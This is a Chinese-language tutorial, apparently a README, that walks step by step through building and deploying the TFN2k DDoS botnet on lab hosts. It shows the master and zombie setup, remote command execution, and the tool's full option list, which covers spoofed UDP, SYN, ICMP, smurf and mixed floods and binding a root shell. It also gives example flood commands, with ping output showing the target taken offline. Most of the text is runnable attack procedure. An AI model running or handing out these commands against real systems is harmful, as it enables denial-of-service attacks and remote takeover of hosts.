

TFN2k 模拟攻击示例
==================

参考[1]
-----------

#1. 编译

>`git clone https://github.com/poornigga/tfn2k`

>`cd tfn2k`

>`make`


#2. 安装

##测试环境：

>主控端tfn：10.4.3.145

>被控端td:

>1. 10.4.192.26

>2. 10.4.3.117

>3. 10.4.3.145  (10.4.3.145既做主控端又做被控端，即主控端自身也是肉鸡)

##测试手段：
>10.4.3.145指挥10.4.192.26,10.4.3.117,10.4.3.145去攻击10.4.192.25

##主控端安装

>将td,tfn两程序FTP到主控端（10.4.3.145）的/root

>`# ls`

>`serverout0.txt  tfn  td`


##建立host_tfn文件，设立肉鸡地址，包括自身

># cat  host_tfn

>10.4.192.26     

>10.4.3.145      自身

>10.4.3.117     

##被控端安装

>ftp td到各被控端


#3. 测试

##各被控端起td

>[td@some ~]$ su                 td必须在root下起

>Password:

>[td@some ]# ./td

>[td@some ]# ps -ef

>UID        PID  PPID  C STIME TTY          TIME CMD

>root     24923 24894  1 05:14 pts/1    00:00:00 su

>root     24924 24923  6 05:14 pts/1    00:00:00 bash

>root     24943     1  0 05:14 pts/1    00:00:00 tfn-daemon

>root     24944 24924  0 05:14 pts/1    00:00:00 ps –ef



## 在主控host也要起肉鸡程序td (即主控端自身也是肉鸡)

>telnet 10.4.3.145

>连通性测试

>在所有肉鸡（包括主控端）td都启动后

>在主控端做基本的控制测试

>`# /root/tfn -f host_tfn -c 10 -i "mkdir testaa"`

>Protocol      : random

>Source IP     : random

>Client input  : list

>Command       : execute remote command

>Password verification:  输入00008421 (此为主控端与各肉鸡的握手密码，是编译时生成的)

>Sending out packets: ...

>#


##在各个肉鸡下都会自动建立一个目录testaa,通常建立在td文件存在的目录下

>`# ls`

>`host_tfn  td   tfn  tastaa`

>这证明主控和肉鸡通信正常


#正式开始攻击

##在主控端执行tfn


># /root/tfn

> usage: /root/tfn <options>

> [-P protocol]   Protocol for server communication. Can be ICMP, UDP or TCP.

> Uses a random protocol as default

> [-D n]          Send out n bogus requests for each real one to decoy targets

> [-S host/ip]    Specify your source IP. Randomly spoofed by default, you need

> to use your real IP if you are behind spoof-filtering routers

> [-f hostlist]   Filename containing a list of hosts with TFN servers to contact

> [-h hostname]   To contact only a single host running a TFN server

> [-i target string]      Contains options/targets separated by '@', see below

> [-p port]               A TCP destination port can be specified for SYN floods

> <-c command ID> 0 - Halt all current floods on server(s) immediately

> 1 - Change IP antispoof-level (evade rfc2267 filtering)

>    usage: -i 0 (fully spoofed) to -i 3 (/24 host bytes spoofed)

> 2 - Change Packet size, usage: -i <packet size in bytes>

> 3 - Bind root shell to a port, usage: -i <remote port>

> 4 - UDP flood, usage: -i victim@victim2@victim3@...

> 5 - TCP/SYN flood, usage: -i victim@... [-p destination port]

> 6 - ICMP/PING flood, usage: -i victim@...

> 7 - ICMP/SMURF flood, usage: -i victim@broadcast@broadcast2@...

> 8 - MIX flood (UDP/TCP/ICMP interchanged), usage: -i victim@...

> 9 - TARGA3 flood (IP stack penetration), usage: -i victim@...

> 10 - Blindly execute remote shell command, usage -i command


### tips 

> -c 10是执行一条指令

> -c 4,5,6,7,8,9 是5种DOS攻击

> -c 0 是关闭攻击




## example:

`# /root/tfn -f host_tfn -c 6 -i 10.4.192.25 `

> 从主控端指挥host_tfn内定义的肉鸡向10.4.192.25发动icmp ping 攻击

> Protocol      : random

> Source IP     : random

> Client input  : list

> Target(s)     : 10.4.192.25

> Command       : commence icmp echo flood

> Password verification: 输入00008421

> Sending out packets: ...
 
 
> 过2分钟左右，ping 10.4.192.25就ping不通了

`# ping 10.4.192.25`

> PING 10.4.192.25 (10.4.192.25) 56(84) bytes of data.
 
> --- 10.4.192.25 ping statistics ---

> 16 packets transmitted, 0 received, 100% packet loss, time 14998ms
 

## 关闭攻击

>#/root/tfn -f host_tfn -c 0

> Protocol      : random

> Source IP     : random

> Client input  : list

> Command       : stop flooding

> Password verification:  00008421

> Sending out packets: ...

 
### 关闭攻击后，被攻击主机有可能会恢复通信，也有可能仍不能通信（必须重起），即被“攻死了”

>#ping 10.4.192.25

> PING 10.4.192.25 (10.4.192.25) 56(84) bytes of data.

> From 10.4.3.145 icmp_seq=2 Destination Host Unreachable

> From 10.4.3.145 icmp_seq=3 Destination Host Unreachable

> From 10.4.3.145 icmp_seq=4 Destination Host Unreachable

> From 10.4.3.145 icmp_seq=6 Destination Host Unreachable

> From 10.4.3.145 icmp_seq=7 Destination Host Unreachable

> From 10.4.3.145 icmp_seq=8 Destination Host Unreachable

 
> --- 10.4.192.25 ping statistics ---

> 10 packets transmitted, 0 received, +6 errors, 100% packet loss, time 8998ms
 
>#ping 10.4.192.25

> PING 10.4.192.25 (10.4.192.25) 56(84) bytes of data.

> 64 bytes from 10.4.192.25: icmp_seq=14 ttl=126 time=308 ms

> 64 bytes from 10.4.192.25: icmp_seq=15 ttl=126 time=361 ms

> 64 bytes from 10.4.192.25: icmp_seq=16 ttl=126 time=169 ms

 
 
## TFN发动的攻击包括：

* UDPflood（-c 6)

* TCP SYN flood(-c 5) 

* ICMPreply flood(-c 7)


 
### SYN/TCP攻击并设攻击端口（假设对方是WWW SERVER）

`# ./tfn　-f　hosts.txt　-c　5　-i　192.168.111.88　-p　80`
 

 
### ICMP/TCP/UDP轮流攻击：

`#./tfn　-f　hosts.txt　-c　8　-i　192.168.111.88`

> 会按TCP/UDP/ICMP的轮替方式发攻击包。
  
> tfn 发起攻击，如果目标不可达，比如没路由，PING不通等，他没有任何显示，就是tcpdump下不发包
  
> tfn 只能对IP地址前两个数字至少有一个>100的地址发攻击，即tfn无法攻击10.1.1.1 这是反复实验得来的。

> 一开始发现在192地址下发起攻击有效，但在10的地址下发起攻击无效.
 
 
[1]: http://blog.sina.com.cn/s/blog_6151984a0100exma.html
 
